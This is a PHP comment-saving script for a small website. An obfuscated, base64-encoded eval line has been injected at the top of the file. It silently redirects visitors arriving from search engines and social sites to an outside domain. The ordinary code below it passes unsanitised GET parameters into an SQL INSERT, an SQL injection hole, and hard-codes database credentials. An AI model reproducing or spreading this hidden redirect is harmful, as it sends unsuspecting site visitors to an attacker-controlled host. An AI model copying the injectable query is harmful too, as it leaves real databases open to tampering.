<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vaGluaWEuenlucy5jb20vIik7DQpleGl0KCk7DQp9Cn0KfQ0KfQ0KfQ=="));

// saves comments to the comment table, ie, comments about the site demo... 

$link=mysql_connect("localhost", "lukasber_tvb", "tvb") or die ('I cannot connect to the database because: ' . mysql_error());
$success = mysql_select_db("lukasber_theveggiebox", $link);

$marker_id = NULL;
$name = $_GET['name'];
$comment = $_GET['comment'];

$query = "INSERT INTO `lukasber_theveggiebox`.`comments` (
					`comment_id` ,
					`name` ,
					`comment`
					)
					VALUES (
					NULL , '$name', '$comment'
					);";
			
$result = mysql_query($query, $link);

print($result);

//header('Content-Type: text/xml');

?>
